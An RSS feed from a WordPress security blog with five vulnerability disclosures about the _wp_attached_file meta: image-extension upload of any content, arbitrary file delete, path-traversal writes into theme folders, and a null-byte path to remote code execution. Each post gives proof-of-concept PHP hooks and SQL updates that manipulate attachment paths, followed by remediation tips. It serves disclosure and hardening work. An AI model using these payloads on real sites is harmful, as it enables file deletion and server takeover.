<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>core &#8211; WP deeply</title>
	<atom:link href="https://wpdeeply.com/category/core/feed/" rel="self" type="application/rss+xml" />
	<link>http://wpdeeply.com/</link>
	<description></description>
	<lastBuildDate>Wed, 15 Jul 2020 00:09:08 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=5.4.2</generator>
	<item>
		<title>WordPress attached file meta</title>
		<link>https://wpdeeply.com/wordpress-attached-file-meta/</link>
		
		<dc:creator><![CDATA[root]]></dc:creator>
		<pubDate>Tue, 14 Jul 2020 23:53:34 +0000</pubDate>
				<category><![CDATA[core]]></category>
		<guid isPermaLink="false">https://wpdeeply.com/?p=143</guid>

					<description><![CDATA[WordPress attachment / media protected meta _wp_attached_file is single point of failure for WP. Having access to its value results in RCE as we already show in previous writings: non binary safe imagick function, theme directory writing and arbitrary file delete. There are different paths towards _wp_attached_file, because at the end of the day is meta value, but [&#8230;]]]></description>
										<content:encoded><![CDATA[
<hr class="wp-block-separator"/>



<p>WordPress attachment / media protected meta <code>_wp_attached_file</code> is single point of failure for WP. Having access to its value results in RCE as we already show in previous writings: <a href="https://wpdeeply.com/wordpress-null-byte-to-rce-0-day-bug/" target="_blank" rel="noreferrer noopener">non binary safe imagick function</a>, <a href="https://wpdeeply.com/wordpress-write-image-to-any-directory-rce/" target="_blank" rel="noreferrer noopener">theme directory writing</a> and <a href="https://wpdeeply.com/wordpress-arbitrary-file-delete/" target="_blank" rel="noreferrer noopener">arbitrary file delete</a>. There are different paths towards <code>_wp_attached_file</code>, because at the end of the day is meta value, but also huge effort was put in the past to fix all of the paths towards it &#8211; ofc. not even close enough.</p>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-attached-file-meta.md#eli5-poc"></a>Eli5 PoC</h2>



<p>Let we check the&nbsp;<code>wp_restore_image</code>&nbsp;WP function. There we have:</p>



<pre class="wp-block-code"><code lang="php" class="language-php">$meta             = wp_get_attachment_metadata( $post_id );
$file             = get_attached_file( $post_id );
$backup_sizes     = get_post_meta( $post_id, '_wp_attachment_backup_sizes', true );
</code></pre>



<p>e.g.&nbsp;<code>_wp_attachment_metadata</code>&nbsp;and&nbsp;<code>_wp_attached_file</code>&nbsp; are not handled as regular meta values, but&nbsp;<code>_wp_attachment_backup_sizes</code>&nbsp;is. Later in the code:</p>



<pre class="wp-block-code"><code lang="php" class="language-php">$data = $backup_sizes['full-orig'];
...
$restored_file = path_join( $parts['dirname'], $data['file'] );
$restored      = update_attached_file( $post_id, $restored_file );
</code></pre>



<p>And this show us that anyone with control over the&nbsp;<code>_wp_attachment_backup_sizes</code>&nbsp;have access towards&nbsp;<code>_wp_attached_file</code>. Hint: wordpress-importer and will be used as one of the show cases for full exploitation demo <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-attached-file-meta.md#few-facts"></a>Few facts</h2>



<ul><li>preventing access towards protected meta with&nbsp;<code>current_user_can( 'edit_post_meta',...</code>&nbsp;or just&nbsp;<code>is_protected_meta</code>&nbsp;checks before&nbsp;<code>update_metadata</code>&nbsp;and&nbsp;<code>update_post_meta</code>&nbsp;is impossible with current code base and depends of MySQL configuration</li><li>there are a lot of sinks towards&nbsp;<code>update_attached_file</code>&nbsp;around WP eco system</li><li>take care when using&nbsp;<code>wp_insert_post</code></li></ul>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-attached-file-meta.md#remediation"></a>Remediation</h2>



<ul><li>Why would anyone put remediation to meta value ?!?!?!</li></ul>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>WordPress upload any file with image extension</title>
		<link>https://wpdeeply.com/wordpress-upload-any-file-with-image-extension/</link>
		
		<dc:creator><![CDATA[root]]></dc:creator>
		<pubDate>Mon, 13 Jul 2020 23:54:29 +0000</pubDate>
				<category><![CDATA[core]]></category>
		<guid isPermaLink="false">https://wpdeeply.com/?p=140</guid>

					<description><![CDATA[Big efforts were put into validation and verification of image uploads in WP as a project. Yet, that isn&#8217;t completed task. In the WP core there is function wp_upload_bits which allows to be &#8220;uploaded&#8221; file with any content with any of the allowed extensions. Beside its widespread usage around eco system  there are two places in the core [&#8230;]]]></description>
										<content:encoded><![CDATA[
<hr class="wp-block-separator"/>



<p>Big efforts were put into validation and verification of image uploads in WP as a project. Yet, that isn&#8217;t completed task. In the WP core there is function <code>wp_upload_bits</code> which allows to be &#8220;uploaded&#8221; file with any content with any of the allowed extensions. Beside its widespread usage around <a href="https://wpdirectory.net/search/01ED57DFTZ2VWRZCD4W7N80R9A">eco system</a>  there are two places in the core where it is used e.g. in <code>xmlrpc</code> service <code>mw_newMediaObject</code> and in <code>wp_generate_attachment_metadata</code>. Via xmlrpc there straight forward upload and via attachment metadata &#8220;image&#8221; creation is possible via faked cover of any allowed audio / video vile. Try it yourself with mp3 and <a href="https://eyed3.readthedocs.io/en/latest/">eyeD3</a>.</p>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-upload-any-file.md#eli5-poc"></a>Eli5 PoC</h2>



<pre class="wp-block-code"><code lang="php" class="language-php">function upload_any_image(){
    wp_upload_bits("wpdeeply.jpg", "", "Learn wp deeply");    
}

add_action(init, "upload_any_image");
</code></pre>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-upload-any-file.md#few-facts"></a>Few facts</h2>



<ul><li><code>wp_check_filetype</code>&nbsp;checks filetype based on extension only</li><li>As default and pushed/advertised&nbsp;<code>ImageMagic</code>&nbsp;via&nbsp;<code>site-health</code>&nbsp;in the core, this is basically turning WP into webgoat for setups where file uploads are enabled</li><li>XSS attacks on many web setups</li><li>backdoors for max allowed upload file size</li></ul>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-upload-any-file.md#remediation"></a>Remediation</h2>



<ul><li><code>add_filter('wp_upload_bits', ...</code>&nbsp;where bits will be placed in tmp image with specified extension and will be validated against&nbsp;<code>wp_check_filetype_and_ext</code></li><li>check how Woo fixed this in the past <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></li></ul>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>WordPress arbitrary file delete</title>
		<link>https://wpdeeply.com/wordpress-arbitrary-file-delete/</link>
		
		<dc:creator><![CDATA[root]]></dc:creator>
		<pubDate>Sun, 12 Jul 2020 23:00:08 +0000</pubDate>
				<category><![CDATA[core]]></category>
		<guid isPermaLink="false">https://wpdeeply.com/?p=136</guid>

					<description><![CDATA[WordPress have a lot of serious issues with paths. There were several tries in the past for security and core team to fix arbitrary file delete issues in the core, but bugs (plural) still remain. Why this bug presented here exist? (there are many another use cases in the core) Because core is solving arbitrary [&#8230;]]]></description>
										<content:encoded><![CDATA[
<hr class="wp-block-separator"/>



<p>WordPress have a lot of serious issues with paths. There were several tries in the past for security and core team to fix arbitrary file delete issues in the core, but bugs (plural) still remain. Why this bug presented here exist? (there are many another use cases in the core) Because core is solving arbitrary file delete on the following way: limit the file (thumbnail) deletion only for the same folder where is file/attachment and make sure thumbnail isn’t used by another media file. Again, technical detailed writing is huge and more advanced (will be presented in near future), but goal of this writing is something else. <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-arbitrary-file-delete.md#eli5-poc"></a>Eli5 PoC</h2>



<ul><li>Upload picture in your WP and get its post_id / attachment_id</li><li>this demo code will delete&nbsp;<code>readme.html</code>&nbsp;from WP root directory</li><li>enable&nbsp;<code>hello.php</code>&nbsp;plugin and append this code at the end</li></ul>



<pre class="wp-block-code"><code lang="php" class="language-php">function afd(){
    
    global $wpdb;
    
    $attachment_id = "93";
    $thumb = "readme.html" 
    //set up 'thumb' on the same way core does
    $newmeta          = wp_get_attachment_metadata( $attachment_id, true );
    $newmeta['thumb'] = wp_basename( $thumb );
    wp_update_attachment_metadata( $attachment_id, $newmeta );
    
    //set up apropriate value for _wp_attached_file
    $wpdb->query("UPDATE `wp_postmeta` SET `meta_value` = '../../license.txt' WHERE `wp_postmeta`.`meta_key` = '_wp_attached_file' and `wp_postmeta`.`post_id` = '".esc_sql($attachment_id)."'");
    //delete attachment    
    wp_delete_attachment($attachment_id);
}

add_action("init", "afd");
</code></pre>



<ul><li><code>readme.html</code>&nbsp;is deleted from the WP root</li></ul>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-arbitrary-file-delete.md#few-facts"></a>Few facts</h2>



<ul><li><code>_wp_attached_file</code>&nbsp;remains single point of failure for WP</li><li>there is use case in the core where creation of backup of any file is possible and this opens door for silent exploitation when arbitrary file delete is in game</li></ul>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-arbitrary-file-delete.md#remediation"></a>Remediation</h2>



<ul><li>core files shouldn’t be writable by www-data user</li><li>plugins files shouldn’t be writable by www-data user</li></ul>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>WordPress write image to any directory RCE</title>
		<link>https://wpdeeply.com/wordpress-write-image-to-any-directory-rce/</link>
		
		<dc:creator><![CDATA[root]]></dc:creator>
		<pubDate>Sun, 12 Jul 2020 20:27:43 +0000</pubDate>
				<category><![CDATA[core]]></category>
		<guid isPermaLink="false">https://wpdeeply.com/?p=131</guid>

					<description><![CDATA[Image cropping in WordPress is sort of unlucky, specially derivation of final image path ( file system or http/s location ), where image will be loaded from the path, but decisions for additional directories creation and final path (no traversal prevention here) are taken from&#160;_wp_attached_file. Those issues are subject for deeper observation and debugging which [&#8230;]]]></description>
										<content:encoded><![CDATA[
<hr class="wp-block-separator"/>



<p>Image cropping in WordPress is sort of unlucky, specially derivation of final image path ( file system or http/s location ), where image will be loaded from the path, but decisions for additional directories creation and final path (no traversal prevention here) are taken from&nbsp;<code>_wp_attached_file</code>. Those issues are subject for deeper observation and debugging which will happen in the very near future, for now we need to get another conclusion.</p>



<h2 id="eli5-poc">Eli5 PoC</h2>



<ul><li>Upload image to your local WP and name it wpdeeply.png (in order to be able to use copy paste from here in next steps)</li><li>Get attachment_id (post_id of the image)</li><li>Enable hello.php plugin and add this code at the end of the file</li></ul>



<pre class="wp-block-code"><code lang="php" class="language-php">function wprcedemo(){
    
    //add your attachment_id here - mine is 77
    $attachment_id = 77;
    
    if ( ! function_exists( 'wp_crop_image' ) ) {
        include ABSPATH . 'wp-admin/includes/image.php';
    }

    wp_crop_image($attachment_id, 0, 0, 300, 300, 300, 300);
    
    exit("good :)");
}

add_action("init", "wprcedemo");

</code></pre>



<ul><li>Open mysql administration tool and execute following query</li></ul>



<pre class="wp-block-code"><code lang="sql" class="language-sql">UPDATE `wp_postmeta` SET `meta_value` =  concat('2020/07/wpdeeply.png#/','boom.png' ) WHERE `wp_postmeta`.`meta_key` = '_wp_attached_file' and `wp_postmeta`.`post_id` = 77
</code></pre>



<ul><li>Refresh the home page (good <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /> should be printed) and under&nbsp;<code>2020/07</code>&nbsp;there should be new directory&nbsp;<code>wpdeeply.png#</code></li><li>Open mysql administration tool and execute following query</li></ul>



<pre class="wp-block-code"><code lang="sql" class="language-sql">UPDATE `wp_postmeta` SET `meta_value` = concat('2020/07/wpdeeply.png#/../../../../themes/twentytwenty/boom.png' ) WHERE `wp_postmeta`.`meta_key` = '_wp_attached_file' and `wp_postmeta`.`post_id` = 77
</code></pre>



<ul><li>Refresh the home page (good <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /> should be printed) and under&nbsp;<code>twentytwenty</code>&nbsp;theme should be&nbsp;<code>cropped-boom.png</code>&nbsp;file</li><li><code>_wp_page_template</code>&nbsp;meta_value away from RCE</li></ul>



<h2 id="few-facts">Few facts</h2>



<ul><li>WordPress allows files with valid image extension and any content in it (not complete security patches from the past)</li><li>This bug is also part of not complete security patch in the past</li><li><code>_wp_attached_file</code>&nbsp;value becomes holy grail of WordPress security and still there are ways to interfere with it (via core)</li><li>WP core via its site-health push users to install/configure WP in that way so core files are writable by web server</li></ul>



<h2 id="remediation">Remediation</h2>



<ul><li>Core files shouldn’t be writable by www-data user</li><li>Theme files shouldn’t be writable by www-data user too</li><li>Turn automatic updates for WP core, plugins, themes OFF</li></ul>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>WordPress null byte to RCE &#8211; 0 day bug</title>
		<link>https://wpdeeply.com/wordpress-null-byte-to-rce-0-day-bug/</link>
		
		<dc:creator><![CDATA[root]]></dc:creator>
		<pubDate>Sun, 12 Jul 2020 20:21:46 +0000</pubDate>
				<category><![CDATA[core]]></category>
		<guid isPermaLink="false">https://wpdeeply.com/?p=124</guid>

					<description><![CDATA[It is common knowledge that non binary safe functions in PHP should be avoided e.g. to be replaced from legacy code with binary safe alternatives. What we have in the WP core&#160;class-wp-image-editor-imagick and we all know that PHP imagick prefers writeImageFile before writeImage because it is binary safe. What does this mean? This means if WP uses class-wp-image-editor-imagick as default image [&#8230;]]]></description>
										<content:encoded><![CDATA[
<hr class="wp-block-separator"/>



<p>It is common knowledge that non binary safe functions in PHP should be avoided e.g. to be replaced from legacy code with binary safe alternatives.</p>



<p>What we have in the WP core&nbsp;<code>class-wp-image-editor-imagick</code></p>



<pre class="wp-block-code"><code lang="php" class="language-php">$this->make_image( $filename, array( $image, 'writeImage' ), array( $filename ) );
</code></pre>



<p>and we all know that PHP imagick prefers <code>writeImageFile</code> before <code>writeImage</code> because it is binary safe. What does this mean? This means if WP uses <code>class-wp-image-editor-imagick</code> as default image editing engine we can salute our RCE because we are null byte away from it when <code>save</code> e.g. <code>_save</code> method is called.</p>



<h2 id="eli5-poc">Eli5 PoC</h2>



<ul><li>upload media file to your local WP called “nullbyte.jpg”</li><li>get its post id ( mine is 91 )</li><li>open mysql administration tool and issue following query:</li></ul>



<pre class="wp-block-code"><code lang="sql" class="language-sql">UPDATE `wp_postmeta` SET `meta_value` = concat('2020/07/nullbyte.jpg#','/go.php',char(0),'.gif' ) WHERE `wp_postmeta`.`post_id` = 91 and `wp_postmeta`.`meta_key` = '_wp_attached_file'
</code></pre>



<ul><li>go to media library, crop image + save</li><li>navigate to https://wp.local/wp-content/uploads/2020/07/nullbyte.jpg%23/go.php</li></ul>



<h2 id="few-facts">Few facts</h2>



<ul><li>Images manipulated with PHP Imagick will hold their old meta data (php shells / code will remain intact)</li><li>WP core had put a lot of efforts to protect <code>_wp_attached_file</code> meta value, but it is bypassable (next days disclosure)</li><li>WP in 5.5 via its site-health will warn users that they need to use ImageMagic on their servers :/</li><li>WP core via its site-health push users to install/configure WP in that way so core files are writable by web server</li><li>have you ever heard about <a href="https://github.com/Slavco/wp-weaver">https://github.com/Slavco/wp-weaver</a> <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></li><li>there are few another attack vectors than described above</li></ul>



<h2 id="remediation">Remediation</h2>



<ul><li>uploads dir shouldn’t be able to run PHP code</li><li>core files shouldn’t be writable by www-data user</li></ul>
]]></content:encoded>
					
		
		
			</item>
	</channel>
</rss>
